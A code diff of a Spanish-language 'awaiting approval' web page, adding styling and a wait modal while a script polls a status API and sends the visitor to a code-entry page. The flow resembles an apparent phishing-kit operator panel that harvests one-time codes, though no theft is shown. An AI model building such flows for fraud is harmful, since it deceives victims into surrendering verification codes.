@@ -1,11 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Esperando aprobación</title>
+<title>Esperando aprobación</title>
+
+<style>
+body{
+  margin:0;
+  height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-family:Arial, sans-serif;
+  background:#f5f7fb;
+}
+
+.frm-modal{
+  text-align:center;
+  background:white;
+  padding:40px;
+  border-radius:15px;
+  box-shadow:0 10px 30px rgba(0,0,0,.1);
+  max-width:400px;
+}
+
+.frm-modal img{
+  margin-top:25px;
+}
+
+.text{
+  color:#444;
+  font-size:16px;
+  line-height:1.5;
+}
+</style>
+
 </head>
 <body>
 
-<h2>⏳ Esperando aprobación...</h2>
+<div id="frm-esperando" class="frm-modal">
+
+  <div class="text">
+    Por favor espere un momento estamos validando algunos datos.<br>
+    Puede tardar entre 1 a 5 minutos.<br>
+    <b>No cierres o recargues esta ventana.</b>
+  </div>
+
+  <img src="assets/preloader2.gif" width="120">
+
+</div>
 
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
@@ -23,8 +65,6 @@ async function revisar(){
     const r = await fetch("/api/estado/"+id);
     const j = await r.json();
 
-    /* ---------- ESTADOS ---------- */
-
     if(j.estado === "codigo"){
       location="codigo.html";
       return;
@@ -40,9 +80,7 @@ async function revisar(){
       return;
     }
 
-    /* ERROR CODIGO */
     if(j.estado === "coderr"){
-
       Swal.fire({
         icon:"error",
         title:"Oopss",
@@ -52,11 +90,9 @@ async function revisar(){
       }).then(()=>{
         location="codigo.html";
       });
-
       return;
     }
 
-    /* seguir esperando */
     setTimeout(revisar,2000);
 
   }catch(e){
@@ -66,7 +102,6 @@ async function revisar(){
 
 revisar();
 </script>
-
 
 </body>
 </html>
